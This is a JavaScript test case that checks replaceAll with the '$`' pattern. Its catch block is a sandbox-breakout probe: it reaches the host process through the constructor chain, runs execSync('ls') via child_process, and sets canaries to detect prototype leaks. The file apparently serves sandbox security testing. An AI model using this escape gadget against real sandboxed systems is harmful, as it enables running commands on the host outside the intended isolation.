try {
    var str = 'Ninguém é igual a ninguém. Todo o ser humano é um estranho ímpar.';
    var result;
    result = str.replaceAll('ninguém', '$`');
    assert.sameValue(result, 'Ninguém é igual a Ninguém é igual a . Todo o ser humano é um estranho ímpar.');
    result = str.replaceAll('Ninguém', '$`');
    assert.sameValue(result, ' é igual a ninguém. Todo o ser humano é um estranho ímpar.');
    result = str.replaceAll('ninguém', '($`)');
    assert.sameValue(result, 'Ninguém é igual a (Ninguém é igual a ). Todo o ser humano é um estranho ímpar.');
    result = str.replaceAll('é', '($`)');
    assert.sameValue(result, 'Ningu(Ningu)m (Ninguém ) igual a ningu(Ninguém é igual a ningu)m. Todo o ser humano (Ninguém é igual a ninguém. Todo o ser humano ) um estranho ímpar.');
    result = str.replaceAll('é', '($`) $`');
    assert.sameValue(result, 'Ningu(Ningu) Ningum (Ninguém ) Ninguém  igual a ningu(Ninguém é igual a ningu) Ninguém é igual a ningum. Todo o ser humano (Ninguém é igual a ninguém. Todo o ser humano ) Ninguém é igual a ninguém. Todo o ser humano  um estranho ímpar.');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}